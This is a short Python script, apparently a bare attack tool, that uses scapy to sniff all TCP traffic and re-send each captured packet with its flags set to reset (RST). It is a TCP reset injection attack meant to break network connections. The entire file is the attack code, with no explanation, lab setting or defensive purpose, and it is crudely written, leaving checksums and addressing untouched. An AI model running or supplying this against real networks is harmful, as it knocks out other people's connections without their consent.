from scapy.all import *
def poison(packet):
    packet['TCP'].flags='R'
    sendp(packet)
sniff(prn=poison,filter='tcp')